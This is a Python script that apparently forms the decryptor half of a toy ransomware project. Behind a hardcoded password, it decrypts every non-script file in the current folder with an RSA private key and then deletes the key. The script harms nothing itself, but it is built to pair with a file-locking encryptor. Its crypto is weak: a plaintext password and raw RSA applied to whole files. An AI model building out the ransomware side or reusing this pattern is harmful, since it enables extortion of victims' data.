#!/usr/bin/env python3

import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

files = os.listdir()
targets = []
key = 'rsa_key.pem'
secret_password = 'hello world'
excluded_files = ('.py', '.pem', '.md')

def decrypt_file_rsa(file_path, private_key):
    with open(file_path, 'rb') as file:
        cipher_text = file.read()
        plaintext = private_key.decrypt(
            cipher_text,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    with open(file_path, 'wb') as file:
        file.write(plaintext)


if os.path.exists(key):
    print('Please enter secret password:')
    entered_password = input('')

    if secret_password == entered_password:
        # Get private key
        with open(key, 'rb') as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

        for file in files:
            file_extension = os.path.splitext(file)[1].lower()

            if file_extension in excluded_files:
                continue

            if os.path.isdir(os.path.abspath(file)):
                continue

            targets.append(file)
            decrypt_file_rsa(file, private_key)

        # Delete key after decryption
        try:
            os.remove(key)
        except OSError as e:
            print(f"Error in deleting key: {e}")

        print('Congratulations... Your Files Have Been Decrypted Successfully')

    else:
        print('Password is wrong!')
else:
    print('Key does not exist!')
